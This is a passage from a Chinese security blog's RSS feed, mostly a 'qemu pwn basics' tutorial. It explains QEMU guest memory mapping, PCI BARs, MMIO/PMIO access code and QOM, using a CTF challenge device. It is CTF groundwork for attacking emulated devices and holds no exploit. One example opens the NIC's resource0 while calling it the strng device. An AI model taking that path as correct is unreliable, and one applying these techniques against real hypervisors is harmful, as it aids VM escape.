class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>最终chunk0_ptr指针被改成了fake_chunk的fd</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/07/17/Educational%20Heap%20Exploitation%202.0%20(how2heap%20glibc%202.31)/#disqus_thread</comments>
    </item>
    
    <item>
      <title>qemu pwn基础</title>
      <link>https://billyotry.github.io/2021/06/07/qemu%20pwn%E5%9F%BA%E7%A1%80/</link>
      <guid>https://billyotry.github.io/2021/06/07/qemu%20pwn%E5%9F%BA%E7%A1%80/</guid>
      <pubDate>Mon, 07 Jun 2021 12:13:55 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;qemu概述&quot;&gt;&lt;a href=&quot;#qemu概述&quot; class=&quot;headerlink&quot; title=&quot;qemu概述&quot;&gt;&lt;/a&gt;qemu概述&lt;/h1&gt;&lt;p&gt;运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="qemu概述"><a href="#qemu概述" class="headerlink" title="qemu概述"></a>qemu概述</h1><p>运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 qemu 进程，而虚拟机的执行线程（如CPU、I/O线程等）对应qemu进程的一个线程。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624747738/0" alt="image-20210607201717970"></p><p>虚拟机所对应的内存结构如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                        Guest&#39; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#39;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><p>qemu进程会为虚拟机mmap分配出相应的虚拟机申请大小的内存，用于给虚拟机当作物理内存（在虚拟机进程中只会看到虚拟地址），也就是qemu进程的虚拟地址空间作为了我们虚拟机的物理地址空间。我们以<code>pwn-Blizzard CTF 2017 Strng</code>为例，</p><p>它的启动脚本如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure><p>可以看到<code>qemu</code>虚拟机对应的内存为<code>1G</code>，也就是<code>1G</code>的物理内存，我们启动后查看<code>qemu</code>的地址空间，可以看到存在一个大小为<code>0x40000000</code>的内存空间，即为该虚拟机的物理内存空间，并且当我改成<code>2G</code>的时候，此时为<code>0x80000000</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624816332/0" alt="image-20210607203605134"></p><p>如果我们在qemu虚拟机中申请一段内存空间，该如何在宿主机中找到该内存呢？</p><p>首先将qemu虚拟机中相应的虚拟地址转化为物理地址，该物理地址就是qemu进程为其分配出来的相应偏移，利用该地址加上偏移即是该虚拟地址对应在宿主机中的地址</p><p>在strng虚拟机中运行如下程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="comment">//third</span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//second</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//first</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr;</span><br><span class="line">    <span class="keyword">uint64_t</span> ptr_mem;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);<span class="comment">//传入我们虚拟机中申请到的虚拟地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>gva_to_gpa</code>即是虚拟机中的虚拟地址转化为物理地址的函数，具体的原理这里就不说了</p><p>由于strng虚拟机是32位的，所以编译命令为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -m32 -O0 mmu.c -o mmu</span><br></pre></td></tr></table></figure><p>使用命令<code>scp -P5555 mmu ubuntu@127.0.0.1:/home/ubuntu</code>将其传至虚拟机中</p><p>最后的结果如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624850287/0" alt="image-20210607204553119"></p><p>从上图我们知道了虚拟机对应的物理内存地址在qemu进程中的地址为<code>0x7f4e03e00000</code>到<code>0x7f4e43e00000</code>，因此相应的字符串地址为<code>0x7f4e03e00000+0x33613008</code>，在gdb中可以得到验证。</p><h1 id="PCI设备地址空间"><a href="#PCI设备地址空间" class="headerlink" title="PCI设备地址空间"></a>PCI设备地址空间</h1><p>PCI设备（如网卡、声卡这些）都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。大小为256字节，其中头部64字节是PCI标准规定的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。前16个字节的格式是一定的，包含头部的类型，设备的总类，设备的性质以及制造商等</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624996615/0" alt="image-20210607212613013"></p><p>其中比较关键的是6个BAR（Base Address Registers），BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR格式如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13625009727/0" alt="image-20210607213046406"></p><p>设备可以申请两类地址空间，memory space和I/O space，它们用BAR的最后一位区别开来。当BAR最后一位为0表示这是映射的是I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2为表示内存的类型，bit2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M，bit3表示是否支持可预取。</p><p>而相对于I/O内存，当最后一位为1表示映射的是I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。</p><p>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p><p>通过I/O space访问设备I/O的方式称为port I/O，或者port mmapped I/O，即PMIO，这种情况下CPU需要使用专用的I/O指令如<code>IN/OUT</code>访问I/O端口</p><h2 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h2><p>在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。</p><h2 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h2><p>在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。</p><blockquote><p>关于mmio和pmio的区别，个人的理解就是mmio中内存和I/O设备的内存和寄存器共享同一地址空间，就是一段空间中如果某个地址是内存，而不是I/O设备的空间，那么访问这个地址就只能是内存，对于pmio来说就是一个地址可能是内存也可能是I/O设备的空间，具体到底是内存还是I/O设备取决于使用的是普通的访问内存的指令还是专门用于访问I/O设备的指令如<code>IN/OUT</code></p></blockquote><h2 id="qemu中查看pci设备"><a href="#qemu中查看pci设备" class="headerlink" title="qemu中查看pci设备"></a>qemu中查看pci设备</h2><p>依旧通过strng这道题的虚拟机来查看pci设备来增强理解</p><p><code>lspci</code>命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息</p><p>pci设备的寻址是由总线、设备以及功能构成，如下所示：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式</p><p>可以使用lspci命令以树状的形式输出pci结构</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]</span><br><span class="line">           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI</span><br><span class="line">           +-02.0  Device 1234:1111</span><br><span class="line">           +-03.0  Device 1234:11e9</span><br><span class="line">           \-04.0  Intel Corporation 82540EM Gigabit Ethernet Controller</span><br></pre></td></tr></table></figure><p>其中[<code>0000]</code>表示pci的域，PCI域最多可以承载256条总线。每条总线最多可以有32个设备，每个设备最多可以有8个功能。</p><p>总之每个PCI设备有一个总线号，一个设备号，一个功能号标识。PCI规范允许单个系统占用多达256个总线，但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)有最多 8 个功能。</p><p>PCI设备通过<code>VendorIDs</code>、<code>DeviceIDs</code>、以及<code>Class Codes</code>字段区分：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0</span><br><span class="line">Device:00:03.0</span><br><span class="line">Class:00ff</span><br><span class="line">Vendor:1234</span><br><span class="line">Device:11e9</span><br><span class="line">SVendor:1af4</span><br><span class="line">SDevice:1100</span><br><span class="line">PhySlot:3</span><br><span class="line">Rev:10</span><br><span class="line"></span><br><span class="line">Device:00:03.0</span><br><span class="line">Class:Unclassified device [00ff]</span><br><span class="line">Vendor:Vendor 1234</span><br><span class="line">Device:Device 11e9</span><br><span class="line">SVendor:Red Hat, Inc</span><br><span class="line">SDevice:Device 1100</span><br><span class="line">PhySlot:3</span><br><span class="line">Rev:10</span><br></pre></td></tr></table></figure><p>也可通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上，如前两个字节<code>1234</code>为<code>vendor id</code>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">0000040</span><br></pre></td></tr></table></figure><p>查看设备内存空间</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">Physical Slot: 3</span><br><span class="line">Flags: fast devsel</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>可以看到该设备有两个空间：BARO为MMIO空间，地址为<code>0xfebf1000</code>，大小为256；BAR1为PMIO空间，端口地址为<code>0xc050</code>，大小为8。</p><p>可以通过查看<code>resource</code>文件来查看其相应的内存空间：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  3 root root    0 Jun  7 13:00 .</span><br><span class="line">drwxr-xr-x 11 root root    0 Jun  7 13:00 ..</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 broken_parity_status</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 class</span><br><span class="line">-rw-r--r--  1 root root  256 Jun  7 13:58 config</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 consistent_dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 d3cold_allowed</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 device</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 enable</span><br><span class="line">lrwxrwxrwx  1 root root    0 Jun  7 14:18 firmware_node -&gt; ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:00 irq</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 local_cpulist</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 local_cpus</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 modalias</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 msi_bus</span><br><span class="line">drwxr-xr-x  2 root root    0 Jun  7 14:18 power</span><br><span class="line">--w--w----  1 root root 4096 Jun  7 14:18 remove</span><br><span class="line">--w--w----  1 root root 4096 Jun  7 14:18 rescan</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 resource</span><br><span class="line">-rw-------  1 root root  256 Jun  7 14:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Jun  7 14:18 resource1</span><br><span class="line">lrwxrwxrwx  1 root root    0 Jun  7 14:18 subsystem -&gt; ../../../bus/pci</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 subsystem_device</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 subsystem_vendor</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 13:00 uevent</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 vendor</span><br></pre></td></tr></table></figure><p><code>resource</code>文件包含其他相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识为（flags）。</p><h1 id="qemu中访问I-O空间"><a href="#qemu中访问I-O空间" class="headerlink" title="qemu中访问I/O空间"></a>qemu中访问I/O空间</h1><p>存在mmio与pmio，那么在系统中该如何访问这两个空间呢？访问mmio与pmio都可以采用在内核态访问或者在用户空间编程进行访问。</p><h2 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h2><p>编译内核模块，在内核态访问mmio空间，实例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure><p>另一种就是常用的在用户态访问mmio空间，通过映射<code>resource0</code>文件实现内存的访问，实例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">        mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h2><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure><p>用户空间访问则需要先调用<code>iopl</code>函数申请访问端口，示例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure><h1 id="QOM编程模型"><a href="#QOM编程模型" class="headerlink" title="QOM编程模型"></a>QOM编程模型</h1><p>qemu提供了一套面向对象编程的模型–QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p><p>由于qemu模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解C++或其他面向对象语言来理解QOM。</p><p>有几个比较关键的结构体：<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。</p><p><code>TypeInfo</code>是用户用来定义一个<code>Type</code>的数据结构，用于定义了一个<code>TypeInfo</code>，然后调用<code>type_register(TypeInfo)</code>或者<code>type_register_static(TypeInfo)</code>函数，就会生成相应的<code>TypeImpl</code>实例，将这个<code>TypeInfo</code>注册到全局TypeImpl的<code>hash</code>表中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *parent;</span><br><span class="line">    <span class="keyword">size_t</span> instance_size;</span><br><span class="line">    <span class="keyword">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="keyword">bool</span> abstract;</span><br><span class="line">    <span class="keyword">size_t</span> class_size;</span><br><span class="line">    <span class="keyword">void</span> (*class_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_finalize)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span 